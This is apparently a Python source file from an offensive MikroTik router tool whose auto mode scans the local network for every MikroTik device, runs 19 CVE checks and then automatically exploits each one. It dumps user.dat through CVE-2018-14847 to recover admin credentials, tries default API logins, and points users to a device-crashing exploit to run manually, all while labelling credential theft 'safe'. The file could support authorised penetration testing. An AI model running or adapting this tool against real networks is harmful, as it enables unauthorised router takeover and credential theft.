#!/usr/bin/python3
# coding=utf-8
# AUTO MODE: find all MikroTik devices -> scan all 19 CVEs -> run the
# safe exploits automatically -> print a full report. One button in the GUI.
# Destructive actions (CVE-2020-24571 crash) are NEVER run automatically.

import os
import sys
import time

from color import R, P, W, B, N, T, Y, WOW, vulnexploit, failexploit
from net_scan import discover_all, arp_resolve
from exploit_actions import (_probe_target_version, userdat_dump,
                             api_default_creds)

if os.name == "nt":
    try:
        os.system("")
    except Exception:
        pass


def _scan_device(dev, pause=3):
    ip = dev["ip"]
    print(f"{WOW}\n{'=' * 72}{N}")
    print(f"{W}[{P} * {W}]{B} DEVICE: {W}{ip}{N}  "
          f"{B}MAC: {W}{dev['mac']}{N}")
    print(f"{W}{'=' * 72}{N}")

    ver_raw, tmac = _probe_target_version(ip, 3)
    if ver_raw:
        dev["version"] = ver_raw
        print(f"{W}[{P} * {W}]{B} Version  : {T}{ver_raw}{N}")
    if tmac:
        dev["mac"] = tmac

    from modern_check import ModernChecker
    c = ModernChecker(ip)
    print(f"{W}[{P} * {W}]{B} Running all {T}19{N}{B} CVE checks ...{N}")
    c.run_all(pause)
    dev["vuln"] = sum(1 for r in c.results if r)

    # ---- automatic exploit phase (safe actions only) ----
    print(f"{WOW}\n[ AUTO-EXPLOIT PHASE - target {ip} ]{N}")
    ver = c.version or (0, 0, 0)
    done = False

    # 1) CVE-2018-14847 -> dump user.dat (read-only)
    if ver[0] == 5 or (ver[0] == 6 and ver[:3] <= (6, 42, 0)):
        mac = tmac or c.mac or dev.get("mac")
        if mac:
            data = userdat_dump(mac, ip)
            dev["userdat"] = bool(data and len(str(data)) > 5)
            done = True
            time.sleep(pause)

    # 2) CVE-2026-16347 -> default API creds (harmless login attempts)
    if c._port_open(8728):
        cred = api_default_creds(ip)
        if cred:
            dev["creds"] = f"{cred[0]} / {cred[1]}"
        done = True

    # 3) CVE-2020-24571 is destructive (reboots the device) -> SKIPPED
    if 6 == ver[0] and (6, 44, 0) <= ver[:3] <= (6, 47, 9):
        print(f"{W}[{T} ! {W}]{Y} CVE-2020-24571 (crash) detected but "
              f"skipped: destructive. Run option {B}7{N}{Y} manually.{N}")

    if not done:
        print(f"{W}[{R} - {W}]{B} No safe exploit action applies "
              f"(version {ver_raw or 'unknown'}).{N}")
    return dev


def run_auto(scan_timeout=6, pause=3):
    print(f"{WOW}\n{'#' * 72}{N}")
    print(f"{WOW}   AUTO MODE: MikroTik network scan + 19 CVE checks + "
          f"safe exploits{N}")
    print(f"{WOW}{'#' * 72}{N}")

    print(f"{W}[{P} * {W}]{B} Step 1/3 - Finding all MikroTik devices "
          f"({T}{scan_timeout}{B}s)...{N}")
    devices = arp_resolve(discover_all(scan_timeout))
    if not devices:
        print(f"{W}[{R} - {W}]{B} No MikroTik devices answered on this LAN. "
              f"Nothing to do.{N}")
        if os.name == "nt":
            print(f"{W}[{Y} ! {W}]{B} Windows tips:{N}")
            print(f"{W}     1. Allow Python through Windows Firewall "
                  f"(private networks).{N}")
            print(f"{W}     2. Run the app as Administrator "
                  f"(start.bat does this automatically).{N}")
            print(f"{W}     3. Make sure the device is on the same "
                  f"network (and Wi-Fi isolation is OFF).{N}")
        return []

    report = []
    for i, dev in enumerate(devices, 1):
        ip = dev["ip"]
        if ip in ("0.0.0.0", ""):
            print(f"{W}[{R} ! {W}]{Y} Device {i} ({dev['mac']}, "
                  f"{dev['version']}) has no reachable IP on this subnet - "
                  f"skipping scan. Plug it in with an IP to test it.{N}")
            report.append({**dev, "ip": "N/A", "vuln": 0,
                           "note": "no IP reachable"})
            continue
        try:
            report.append(_scan_device(dev, pause))
        except KeyboardInterrupt:
            print(f"{W}[{R} ! {W}]{B} Interrupted by user.{N}")
            break
        except Exception as e:
            print(f"{W}[{R} - {W}]{B} Device {ip} failed: {e}{N}")
            report.append({**dev, "vuln": 0, "note": f"error: {e}"})

    # ---- final report ----
    print(f"{WOW}\n{'=' * 72}{N}")
    print(f"{WOW}   FINAL REPORT - {len(report)} device(s) processed{N}")
    print(f"{WOW}{'=' * 72}{N}")
    for i, d in enumerate(report, 1):
        ip = d.get("ip", "?")
        mac = d.get("mac", "?")
        ver = d.get("version", "?")
        vuln = d.get("vuln", 0)
        creds = d.get("creds")
        userdat = d.get("userdat")
        line = (f"{W}[{T}{i:>2}{W}]{B} {ip:<15}{W}{mac:<20}"
                f"{T}{ver:<22}{N}")
        if vuln:
            line += f"{vulnexploit}{B} {vuln} VULN{N}"
        else:
            line += f"{failexploit}{B} 0 VULN{N}"
        print(line)
        if creds:
            print(f"{W}      {P}>>> API CREDENTIALS FOUND: {T}{creds}{N}")
        if userdat:
            print(f"{W}      {P}>>> user.dat DUMPED (admin credentials){N}")
        if d.get("note"):
            print(f"{W}      {Y}note: {d['note']}{N}")
    print(f"{W}{'-' * 72}{N}")
    print(f"{W}[{P} * {W}]{B} Done. Destructive exploit (24571 crash) "
          f"must be run manually via option {B}7{N}{B}.{N}")
    return report


if __name__ == "__main__":
    run_auto()